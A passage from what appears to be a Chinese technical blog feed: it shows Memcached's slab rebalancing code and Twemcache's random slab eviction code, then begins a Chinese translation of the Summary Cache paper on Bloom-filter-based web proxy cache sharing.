class="hljs-comment"> * If ITEM_LINKED did exist and was just removed, but we still see it, that&#x27;s</span><br><span class="hljs-comment"> * still safe since it will have a valid key, which we then lock, and then</span><br><span class="hljs-comment"> * recheck everything.</span><br><span class="hljs-comment"> * This may not be safe on all platforms; If not, slabs_alloc() will need to</span><br><span class="hljs-comment"> * seed the item key while holding slabs_lock.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">slab_rebalance_move</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-type">slabclass_t</span> *s_cls;<br>    <span class="hljs-type">int</span> was_busy = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> refcount = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> hv;<br>    <span class="hljs-type">void</span> *hold_lock;<br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">move_status</span> <span class="hljs-title">status</span> =</span> MOVE_PASS;<br><br>    s_cls = &amp;slabclass[slab_rebal.s_clsid];<br>    <span class="hljs-comment">// the offset to check if completed or not</span><br>    <span class="hljs-type">int</span> offset = ((<span class="hljs-type">char</span>*)slab_rebal.slab_pos-(<span class="hljs-type">char</span>*)slab_rebal.slab_start)/(s_cls-&gt;size);<br><br>    <span class="hljs-comment">// skip acquiring the slabs lock for items we&#x27;ve already fully processed.</span><br>    <span class="hljs-keyword">if</span> (slab_rebal.completed[offset] == <span class="hljs-number">0</span>) &#123;<br>        pthread_mutex_lock(&amp;slabs_lock);<br>        hv = <span class="hljs-number">0</span>;<br>        hold_lock = <span class="hljs-literal">NULL</span>;<br>        item *it = slab_rebal.slab_pos;<br><br>        item_chunk *ch = <span class="hljs-literal">NULL</span>;<br>        status = MOVE_PASS;<br><br>        <span class="hljs-keyword">if</span> (it-&gt;it_flags &amp; ITEM_CHUNK) &#123;<br>            <span class="hljs-comment">/* This chunk is a chained part of a larger item. */</span><br>            ch = (item_chunk *) it;<br>            <span class="hljs-comment">/* Instead, we use the head chunk to find the item and effectively</span><br><span class="hljs-comment">             * lock the entire structure. If a chunk has ITEM_CHUNK flag, its</span><br><span class="hljs-comment">             * head cannot be slabbed, so the normal routine is safe. */</span><br>            it = ch-&gt;head;<br>            assert(it-&gt;it_flags &amp; ITEM_CHUNKED);<br>        &#125;<br><br>        <span class="hljs-comment">/* ITEM_FETCHED when ITEM_SLABBED is overloaded to mean we&#x27;ve cleared</span><br><span class="hljs-comment">         * the chunk for move. Only these two flags should exist.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (it-&gt;it_flags != (ITEM_SLABBED|ITEM_FETCHED)) &#123;<br>            <span class="hljs-comment">/* ITEM_SLABBED can only be added/removed under the slabs_lock */</span><br>            <span class="hljs-keyword">if</span> (it-&gt;it_flags &amp; ITEM_SLABBED) &#123;<br>                assert(ch == <span class="hljs-literal">NULL</span>);<br>                slab_rebalance_cut_free(s_cls, it);<br>                status = MOVE_FROM_SLAB;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((it-&gt;it_flags &amp; ITEM_LINKED) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">/* If it doesn&#x27;t have ITEM_SLABBED, the item could be in any</span><br><span class="hljs-comment">                 * state on its way to being freed or written to. If no</span><br><span class="hljs-comment">                 * ITEM_SLABBED, but it&#x27;s had ITEM_LINKED, it must be active</span><br><span class="hljs-comment">                 * and have the key written to it already.</span><br><span class="hljs-comment">                 */</span><br>                hv = hash(ITEM_key(it), it-&gt;nkey);<br>                <span class="hljs-keyword">if</span> ((hold_lock = item_trylock(hv)) == <span class="hljs-literal">NULL</span>) &#123;<br>                    status = MOVE_LOCKED;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-type">bool</span> is_linked = (it-&gt;it_flags &amp; ITEM_LINKED);<br>                    refcount = refcount_incr(it);<br>                    <span class="hljs-keyword">if</span> (refcount == <span class="hljs-number">2</span>) &#123; <span class="hljs-comment">/* item is linked but not busy */</span><br>                        <span class="hljs-comment">/* Double check ITEM_LINKED flag here, since we&#x27;re</span><br><span class="hljs-comment">                         * past a memory barrier from the mutex. */</span><br>                        <span class="hljs-keyword">if</span> (is_linked) &#123;<br>                            status = MOVE_FROM_LRU;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-comment">/* refcount == 1 + !ITEM_LINKED means the item is being</span><br><span class="hljs-comment">                             * uploaded to, or was just unlinked but hasn&#x27;t been freed</span><br><span class="hljs-comment">                             * yet. Let it bleed off on its own and try again later */</span><br>                            status = MOVE_BUSY;<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (refcount &gt; <span class="hljs-number">2</span> &amp;&amp; is_linked) &#123;<br>                        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Mark items for delete/rescue and process</span><br>                        <span class="hljs-comment">// outside of the main loop.</span><br>                        <span class="hljs-keyword">if</span> (slab_rebal.busy_loops &gt; SLAB_MOVE_MAX_LOOPS) &#123;<br>                            slab_rebal.busy_deletes++;<br>                            <span class="hljs-comment">// Only safe to hold slabs lock because refcount</span><br>                            <span class="hljs-comment">// can&#x27;t drop to 0 until we release item lock.</span><br>                            STORAGE_delete(storage, it);<br>                            pthread_mutex_unlock(&amp;slabs_lock);<br>                            do_item_unlink(it, hv);<br>                            pthread_mutex_lock(&amp;slabs_lock);<br>                        &#125;<br>                        status = MOVE_BUSY;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (settings.verbose &gt; <span class="hljs-number">2</span>) &#123;<br>                            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Slab reassign hit a busy item: refcount: %d (%d -&gt; %d)\n&quot;</span>,<br>                                it-&gt;refcount, slab_rebal.s_clsid, slab_rebal.d_clsid);<br>                        &#125;<br>                        status = MOVE_BUSY;<br>                    &#125;<br>                    <span class="hljs-comment">/* Item lock must be held while modifying refcount */</span><br>                    <span class="hljs-keyword">if</span> (status == MOVE_BUSY) &#123;<br>                        refcount_decr(it);<br>                        item_trylock_unlock(hold_lock);<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">/* See above comment. No ITEM_SLABBED or ITEM_LINKED. Mark</span><br><span class="hljs-comment">                 * busy and wait for item to complete its upload. */</span><br>                status = MOVE_BUSY;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-type">int</span> save_item = <span class="hljs-number">0</span>;<br>        item *new_it = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-type">size_t</span> ntotal = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">switch</span> (status) &#123;<br>            <span class="hljs-keyword">case</span> MOVE_FROM_LRU:<br>                <span class="hljs-comment">/* Lock order is LRU locks -&gt; slabs_lock. unlink uses LRU lock.</span><br><span class="hljs-comment">                 * We only need to hold the slabs_lock while initially looking</span><br><span class="hljs-comment">                 * at an item, and at this point we have an exclusive refcount</span><br><span class="hljs-comment">                 * (2) + the item is locked. Drop slabs lock, drop item to</span><br><span class="hljs-comment">                 * refcount 1 (just our own, then fall through and wipe it</span><br><span class="hljs-comment">                 */</span><br>                <span class="hljs-comment">/* Check if expired or flushed */</span><br>                ntotal = ITEM_ntotal(it);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> EXTSTORE</span><br>                <span class="hljs-keyword">if</span> (it-&gt;it_flags &amp; ITEM_HDR) &#123;<br>                    ntotal = (ntotal - it-&gt;nbytes) + <span class="hljs-keyword">sizeof</span>(item_hdr);<br>                &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                <span class="hljs-comment">/* REQUIRES slabs_lock: CHECK FOR cls-&gt;sl_curr &gt; 0 */</span><br>                <span class="hljs-keyword">if</span> (ch == <span class="hljs-literal">NULL</span> &amp;&amp; (it-&gt;it_flags &amp; ITEM_CHUNKED)) &#123;<br>                    <span class="hljs-comment">/* Chunked should be identical to non-chunked, except we need</span><br><span class="hljs-comment">                     * to swap out ntotal for the head-chunk-total. */</span><br>                    ntotal = s_cls-&gt;size;<br>                &#125;<br>                <span class="hljs-keyword">if</span> ((it-&gt;exptime != <span class="hljs-number">0</span> &amp;&amp; it-&gt;exptime &lt; current_time)<br>                    || item_is_flushed(it)) &#123;<br>                    <span class="hljs-comment">/* Expired, don&#x27;t save. */</span><br>                    save_item = <span class="hljs-number">0</span>;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch == <span class="hljs-literal">NULL</span> &amp;&amp;<br>                        (new_it = slab_rebalance_alloc(ntotal, slab_rebal.s_clsid)) == <span class="hljs-literal">NULL</span>) &#123;<br>                    <span class="hljs-comment">/* Not a chunk of an item, and nomem. */</span><br>                    save_item = <span class="hljs-number">0</span>;<br>                    slab_rebal.evictions_nomem++;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch != <span class="hljs-literal">NULL</span> &amp;&amp;<br>                        (new_it = slab_rebalance_alloc(s_cls-&gt;size, slab_rebal.s_clsid)) == <span class="hljs-literal">NULL</span>) &#123;<br>                    <span class="hljs-comment">/* Is a chunk of an item, and nomem. */</span><br>                    save_item = <span class="hljs-number">0</span>;<br>                    slab_rebal.evictions_nomem++;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">/* Was whatever it was, and we have memory for it. */</span><br>                    save_item = <span class="hljs-number">1</span>;<br>                &#125;<br>                pthread_mutex_unlock(&amp;slabs_lock);<br>                <span class="hljs-keyword">if</span> (save_item) &#123;<br>                    <span class="hljs-keyword">if</span> (ch == <span class="hljs-literal">NULL</span>) &#123;<br>                        assert((new_it-&gt;it_flags &amp; ITEM_CHUNKED) == <span class="hljs-number">0</span>);<br>                        <span class="hljs-comment">/* if free memory, memcpy. clear prev/next/h_bucket */</span><br>                        <span class="hljs-built_in">memcpy</span>(new_it, it, ntotal);<br>                        new_it-&gt;prev = <span class="hljs-number">0</span>;<br>                        new_it-&gt;next = <span class="hljs-number">0</span>;<br>                        new_it-&gt;h_next = <span class="hljs-number">0</span>;<br>                        <span class="hljs-comment">/* These are definitely required. else fails assert */</span><br>                        new_it-&gt;it_flags &amp;= ~ITEM_LINKED;<br>                        new_it-&gt;refcount = <span class="hljs-number">0</span>;<br>                        do_item_replace(it, new_it, hv);<br>                        <span class="hljs-comment">/* Need to walk the chunks and repoint head  */</span><br>                        <span class="hljs-keyword">if</span> (new_it-&gt;it_flags &amp; ITEM_CHUNKED) &#123;<br>                            item_chunk *fch = (item_chunk *) ITEM_schunk(new_it);<br>                            fch-&gt;next-&gt;prev = fch;<br>                            <span class="hljs-keyword">while</span> (fch) &#123;<br>                                fch-&gt;head = new_it;<br>                                fch = fch-&gt;next;<br>                            &#125;<br>                        &#125;<br>                        it-&gt;refcount = <span class="hljs-number">0</span>;<br>                        it-&gt;it_flags = ITEM_SLABBED|ITEM_FETCHED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEBUG_SLAB_MOVER</span><br>                        <span class="hljs-built_in">memcpy</span>(ITEM_key(it), <span class="hljs-string">&quot;deadbeef&quot;</span>, <span class="hljs-number">8</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                        slab_rebal.rescues++;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        item_chunk *nch = (item_chunk *) new_it;<br>                        <span class="hljs-comment">/* Chunks always have head chunk (the main it) */</span><br>                        ch-&gt;prev-&gt;next = nch;<br>                        <span class="hljs-keyword">if</span> (ch-&gt;next)<br>                            ch-&gt;next-&gt;prev = nch;<br>                        <span class="hljs-built_in">memcpy</span>(nch, ch, ch-&gt;used + <span class="hljs-keyword">sizeof</span>(item_chunk));<br>                        ch-&gt;refcount = <span class="hljs-number">0</span>;<br>                        ch-&gt;it_flags = ITEM_SLABBED|ITEM_FETCHED;<br>                        slab_rebal.chunk_rescues++;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEBUG_SLAB_MOVER</span><br>                        <span class="hljs-built_in">memcpy</span>(ITEM_key((item *)ch), <span class="hljs-string">&quot;deadbeef&quot;</span>, <span class="hljs-number">8</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                        refcount_decr(it);<br>                    &#125;<br>                    slab_rebal.completed[offset] = <span class="hljs-number">1</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">/* unlink and mark as done if it&#x27;s not</span><br><span class="hljs-comment">                     * a chunked item as they require more book-keeping) */</span><br>                    STORAGE_delete(storage, it);<br>                    <span class="hljs-keyword">if</span> (!ch &amp;&amp; (it-&gt;it_flags &amp; ITEM_CHUNKED) == <span class="hljs-number">0</span>) &#123;<br>                        do_item_unlink(it, hv);<br>                        it-&gt;it_flags = ITEM_SLABBED|ITEM_FETCHED;<br>                        it-&gt;refcount = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEBUG_SLAB_MOVER</span><br>                        <span class="hljs-built_in">memcpy</span>(ITEM_key(it), <span class="hljs-string">&quot;deadbeef&quot;</span>, <span class="hljs-number">8</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                        slab_rebal.completed[offset] = <span class="hljs-number">1</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        ntotal = ITEM_ntotal(it);<br>                        do_item_unlink(it, hv);<br>                        slabs_free(it, ntotal, slab_rebal.s_clsid);<br>                        <span class="hljs-comment">/* Swing around again later to remove it from the freelist. */</span><br>                        slab_rebal.busy_items++;<br>                        was_busy++;<br>                    &#125;<br><br>                &#125;<br>                item_trylock_unlock(hold_lock);<br>                pthread_mutex_lock(&amp;slabs_lock);<br>                <span class="hljs-comment">/* Always remove the ntotal, as we added it in during</span><br><span class="hljs-comment">                 * do_slabs_alloc() when copying the item.</span><br><span class="hljs-comment">                 */</span><br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MOVE_FROM_SLAB:<br>                slab_rebal.completed[offset] = <span class="hljs-number">1</span>;<br>                it-&gt;refcount = <span class="hljs-number">0</span>;<br>                it-&gt;it_flags = ITEM_SLABBED|ITEM_FETCHED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEBUG_SLAB_MOVER</span><br>                <span class="hljs-built_in">memcpy</span>(ITEM_key(it), <span class="hljs-string">&quot;deadbeef&quot;</span>, <span class="hljs-number">8</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MOVE_BUSY:<br>            <span class="hljs-keyword">case</span> MOVE_LOCKED:<br>                slab_rebal.busy_items++;<br>                was_busy++;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MOVE_PASS:<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        pthread_mutex_unlock(&amp;slabs_lock);<br>    &#125;<br><br>    <span class="hljs-comment">// Note: slab_rebal.* is occasionally protected under slabs_lock, but</span><br>    <span class="hljs-comment">// the mover thread is the only user while active: so it&#x27;s only necessary</span><br>    <span class="hljs-comment">// for start/stop synchronization.</span><br>    slab_rebal.slab_pos = (<span class="hljs-type">char</span> *)slab_rebal.slab_pos + s_cls-&gt;size;<br><br>    <span class="hljs-keyword">if</span> (slab_rebal.slab_pos &gt;= slab_rebal.slab_end) &#123;<br>        <span class="hljs-comment">/* Some items were busy, start again from the top */</span><br>        <span class="hljs-keyword">if</span> (slab_rebal.busy_items) &#123;<br>            slab_rebal.slab_pos = slab_rebal.slab_start;<br>            STATS_LOCK();<br>            stats.slab_reassign_busy_items += slab_rebal.busy_items;<br>            STATS_UNLOCK();<br>            slab_rebal.busy_items = <span class="hljs-number">0</span>;<br>            slab_rebal.busy_loops++;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            slab_rebal.done++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> was_busy;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="三、-Twemcache实现方案"><a href="#三、-Twemcache实现方案" class="headerlink" title="三、 Twemcache实现方案"></a>三、 Twemcache实现方案</h2><h3 id="3-1、概念简介"><a href="#3-1、概念简介" class="headerlink" title="3.1、概念简介"></a>3.1、概念简介</h3><p>随机选取一个slab，然后释放该slab中的所有数据。</p><h3 id="3-2、代码实现"><a href="#3-2、代码实现" class="headerlink" title="3.2、代码实现"></a>3.2、代码实现</h3><p>选取随机的slab，然后执行剔除：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Get a random slab from all active slabs and evict it for new allocation.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Note that the slab_table enables us to have O(1) lookup for every slab in</span><br><span class="hljs-comment"> * the system. The inserts into the table are just appends - O(1) and there</span><br><span class="hljs-comment"> * are no deletes from the slab_table. These two constraints allows us to keep</span><br><span class="hljs-comment"> * our random choice uniform.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> slab *<br><span class="hljs-title function_">slab_evict_rand</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br>    <span class="hljs-type">uint32_t</span> tries;<br><br>    tries = SLAB_RAND_MAX_TRIES;<br>    <span class="hljs-keyword">do</span> &#123;<br>        slab = slab_table_rand();<br>        tries--;<br>    &#125; <span class="hljs-keyword">while</span> (tries &gt; <span class="hljs-number">0</span> &amp;&amp; slab-&gt;refcount != <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (tries == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">/* all randomly chosen slabs are in use */</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    log_debug(LOG_DEBUG, <span class="hljs-string">&quot;random-evicting slab %p with id %u&quot;</span>, slab, slab-&gt;id);<br><br>    slab_evict_one(slab);<br><br>    <span class="hljs-keyword">return</span> slab;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>具体执行剔除的代码逻辑：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Evict a slab by evicting all the items within it. This means that the</span><br><span class="hljs-comment"> * items that are carved out of the slab must either be deleted from their</span><br><span class="hljs-comment"> * a) hash + lru Q, or b) free Q. The candidate slab itself must also be</span><br><span class="hljs-comment"> * delinked from its respective slab pool so that it is available for reuse.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Eviction complexity is O(#items/slab).</span><br><span class="hljs-comment"> */</span><br> <span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">slab_evict_one</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> slab *slab)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slabclass</span> *<span class="hljs-title">p</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> *<span class="hljs-title">it</span>;</span><br>    <span class="hljs-type">uint32_t</span> i;<br><br>    p = &amp;slabclass[slab-&gt;id];<br><br>    <span class="hljs-comment">/* candidate slab is also the current slab */</span><br>    <span class="hljs-keyword">if</span> (p-&gt;free_item != <span class="hljs-literal">NULL</span> &amp;&amp; slab == item_2_slab(p-&gt;free_item)) &#123;<br>        p-&gt;nfree_item = <span class="hljs-number">0</span>;<br>        p-&gt;free_item = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* delete slab items either from hash + lru Q or free Q */</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; p-&gt;nitem; i++) &#123;<br>        it = slab_2_item(slab, i, p-&gt;size);<br><br>        ASSERT(it-&gt;magic == ITEM_MAGIC);<br>        ASSERT(it-&gt;refcount == <span class="hljs-number">0</span>);<br>        ASSERT(it-&gt;offset != <span class="hljs-number">0</span>);<br><br>        <span class="hljs-keyword">if</span> (item_is_linked(it)) &#123;<br>            item_reuse(it);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (item_is_slabbed(it)) &#123;<br>            ASSERT(slab == item_2_slab(it));<br>            ASSERT(!TAILQ_EMPTY(&amp;p-&gt;free_itemq));<br><br>            it-&gt;flags &amp;= ~ITEM_SLABBED;<br><br>            ASSERT(p-&gt;nfree_itemq &gt; <span class="hljs-number">0</span>);<br>            p-&gt;nfree_itemq--;<br>            TAILQ_REMOVE(&amp;p-&gt;free_itemq, it, i_tqe);<br>            stats_slab_decr(slab-&gt;id, item_free);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* unlink the slab from its class */</span><br>    slab_lruq_remove(slab);<br><br>    stats_slab_incr(slab-&gt;id, slab_evict);<br>    stats_slab_decr(slab-&gt;id, slab_curr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-3、效果演示-视频"><a href="#3-3、效果演示-视频" class="headerlink" title="3.3、效果演示(视频)"></a>3.3、效果演示(视频)</h3><iframe width="100%" height="315" src="https://www.youtube.com/embed/EtROv2or8SE" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> Memcached </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>译 - Summary Cache: A Scalable Wide-Area Web Cache Sharing Protocol</title>
      <link href="/2020/05/23/bloom-filter-summary-cache-paper/"/>
      <url>/2020/05/23/bloom-filter-summary-cache-paper/</url>
      
        <content type="html"><![CDATA[<p><a href="http://pages.cs.wisc.edu/~jussara/papers/00ton.pdf">《Summary Cache: A Scalable Wide-Area Web Cache Sharing Protocol》</a>翻译过来是 《摘要缓存：可扩展的广域 Web 缓存共享协议》，这篇文章中提出了布隆过滤器的设计背景以及实现原理，详细介绍了在误判率以及存储空间之间的权衡，之后很多系统中实现的布隆过滤器基本都是参考了这篇文论的实现。</p><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Web Proxy之间的共享缓存是减少Web流量并缓解网络瓶颈的一项重要技术。然而，由于现有协议的开销，它并未得到广泛部署。在本文中，我们演示了缓存共享的好处，衡量了现有协议的开销，并提出了一种称为”摘要缓存’’的新协议。在这个新协议中，每个Proxy都保留了一个包含所有Proxy的缓存摘要目录，并在任何查询之前都要检查在这些摘要之中是否存在潜在的匹配项。有两个因素利于我们协议的低开销：摘要的定期更新以及十分简朴的目录信息，每个条目只有<strong>8bits</strong>。通过使用跟踪驱动的仿真和原型实现，我们证明了与现有的协议（例如 Internet 的缓存协议ICP）相比，”摘要缓存”将<strong>缓存间协议消息的数量减少了25到60</strong>，带宽消耗<strong>减少了超过50%</strong>，<strong>消除了75%到95%的CPU处理协议开销</strong>，同时<strong>保持了与ICP几乎相同的缓存命中率</strong>。因此”摘要缓存”可以扩展到大量的Proxy。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>随着万维网的巨大增长给互联网带来的持续压力，缓存已经被认为是减少带宽消耗的最重要的技术之一[29]。特别是Web代理中的缓存已经被证明十分有效[14,33]。为了获得缓存的全部好处，常见瓶颈环节后面的代理环境应该相互配合并未彼此的未命中服务，从而进一步减少通过瓶颈的流量。我们称这个过程为 “Web缓存共享”。</p><p>Web共享缓存的概念最初是在Harvest项目中被提出的[26,12]。Harvest小组设计了Internet缓存协议（ICP）[18]，该协议支持从相邻的缓存中发现和检索文档。如今，很多机构和很多国家都建立了代理缓存的层次结构，这些层次结构通过ICP进行合作已减少Internet流量[25,30,41,5,14]。</p><p>然而，ICP协议的开销目前阻碍了Web共享缓存的广泛部署。ICP在代理发生缓存未命中的时候会讲查询消息多播到其他的代理来尝试在其他代理中命中该消息。因此随着代理数量的增加，通信和CPU的处理开销都将成倍的增加。</p><p>目前已经提出了很多替代协议来解决该问题，例如，一种在代理之间划分URL空间的缓存陈列路由协议[46]。但是，此类解决方案通常不适用于广域网缓存共享，其特点是代理之间的网络带宽有限以及代理与其用户之间的网络距离不均匀（例如，每个代理可能更靠近一个用户组而不是其他用户组）。</p><p>在本文中，我们解决了用于关于Web共享缓存的可伸缩协议的问题。我们首先通过分析Web访问跟踪的采集信息来检查Web共享缓存的好处。我们表明，在代理之间共享缓存的内存会显著减少Web服务器的通信量，并可简单的缓存共享（无需在代理的缓存之间进行协调）就足以获得完全协调的缓存的大部分好处。我们还通过运行一组代理基准来量化ICP协议的开销。结果表明，即使协作代理的数量低至四个，ICP也会讲代理间的流量增加70到90倍，每个代理接收到的网络数据包的数量也增加了13%甚至更多，并且CPU的开销也超过了15%。​ 在没有代理间缓存命中（也称为远程缓存命中）的情况下，开销可以使平均用户延迟增加多达11%。</p><p>然后，我们提出了一种称为摘要缓存的新缓存共享协议。在此协议下，每个代理都保留每个其他代理的缓存目录的简明摘要。当发生高速缓存未命中时，代理首先探测所有的摘要信息，以查看该请求是否可能是其他代理中的高速缓存命中，然后仅将查询消息发送给其摘要显示出有希望的结果的那些代理。摘要信息不一定总是准确的。如果摘要中显示的请求并没有缓存命中（错误命中），则结果就是浪费了查询消息。如果摘要中另有说明（虚假未命中）时请求是缓存命中，则结果就是较高的未命中率。</p><p>我们研究了协议设计中的两个关键问题：摘要更新的频率和摘要的表现方式。使用跟踪驱动的模拟，我们显示摘要的更新可以延迟到新的固定百分比（例如<code>1％</code>）的缓存文档，并且命中率将成比例降低（对于<code>1％</code>的选择，降级为介于<code>0.02％</code>至<code>1.7％</code>之间，具体取决于轨迹）。</p><p>为了减少内存需求，我们将每个摘要存储为”布隆过滤器”。这是一种计算效率非常高的基于哈希的概率方案，它可以表示一组具有最低内存要求的键（在我们的情况下为高速缓存目录），同时成员查询的假阴性概率为0，误报率很低。跟踪驱动的模拟表明，对于典型的代理配置，对于仅在N个字节内表示的N个缓存文档，误报的百分比为<code>1％</code>至<code>2％</code>。实际上，可以通过增加误报率为代价而进一步减少存储器。（我们稍后将更详细地描述Bloom过滤器。）</p><p>基于这些结果，我们设计了摘要缓存增强的ICP协议，并在Squid代理中实现了原型。通过使用跟踪驱动的仿真以及基准测试和跟踪重放的实验，我们证明了新协议将<strong>代理间消息的数量减少了25到60倍以上，网络带宽的消耗（以传输的字节数表示） ）降低了50％以上，并减少了30％到95％的协议在CPU上开销</strong>。与没有缓存共享的情况相比，我们的实验表明，该协议只产生很少的网络流量，并且<strong>仅将CPU时间增加5％到12％</strong>，具体取决于远程缓存命中率。但是，该协议在大多数情况下都达到了类似于ICP协议的缓存命中率。</p><p>结果表明，摘要缓存增强型ICP协议可以扩展到大量代理。因此，它有可能显著增加Web缓存共享的部署并减少Internet上的Web流量。为此，我们正在将我们的实施公开发布[ 15 ]，并且正在将其转移到ICP用户社区。</p><h2 id="轨迹和模拟"><a href="#轨迹和模拟" class="headerlink" title="轨迹和模拟"></a>轨迹和模拟</h2><p><strong>表1</strong>：有关跟踪的统计信息。 命中率和字节命中率是在无限缓存下实现的。</p><table><thead><tr><th align="center">Traces</th><th align="center">DEC</th><th align="center">UCB</th><th align="center">UPisa</th><th align="center">Questnet</th><th align="center">NLANR</th></tr></thead><tbody><tr><td align="center">Time(时间)</td><td align="center">8&#x2F;29-9&#x2F;4, 1996</td><td align="center">9&#x2F;14-9&#x2F;19, 1996</td><td align="center">Jan-March, 1997</td><td align="center">1&#x2F;15-1&#x2F;21, 1998</td><td align="center">12&#x2F;22, 1997</td></tr><tr><td align="center">Requests(请求数)</td><td align="center">3543968</td><td align="center">1907762</td><td align="center">2833624</td><td align="center">2885285</td><td align="center">1766409</td></tr><tr><td align="center">Infinite Cache Size(无限缓存大小)</td><td align="center">2.88e+10</td><td align="center">1.80e+10</td><td align="center">2.07e+10</td><td align="center">2.33e+10</td><td align="center">1.37e+10</td></tr><tr><td align="center">Maximum Hit Ratio(最大命中率)</td><td align="center">0.49</td><td align="center">0.30</td><td align="center">0.40</td><td align="center">0.30</td><td align="center">0.36</td></tr><tr><td align="center">Maximum ByteHit Ratio(最大字节命中率)</td><td align="center">0.36</td><td align="center">0.14</td><td align="center">0.27</td><td align="center">0.15</td><td align="center">0.27</td></tr><tr><td align="center">Client Population(客户人数)</td><td align="center">10089</td><td align="center">5780</td><td align="center">2203</td><td align="center">12</td><td align="center">4</td></tr><tr><td align="center">Client Groups(客户群)</td><td align="center">16</td><td align="center">8</td><td align="center">8</td><td align="center">12</td><td align="center">4</td></tr></tbody></table><p>在我们的研究中，我们收集了五组HTTP请求的痕迹。<strong>表1</strong>中列出了每个跟踪中的请求数，客户端数以及其他统计信息 。特别是，<strong>表1</strong>列出了每个跟踪的”无限’’缓存大小，即跟踪中唯一文档的总大小（以字节为单位）（即”无限’’缓存的大小，不会导致缓存的替换）。</p><ul><li><p><strong>DEC</strong>跟踪[32]：Digital Equipment Corporation 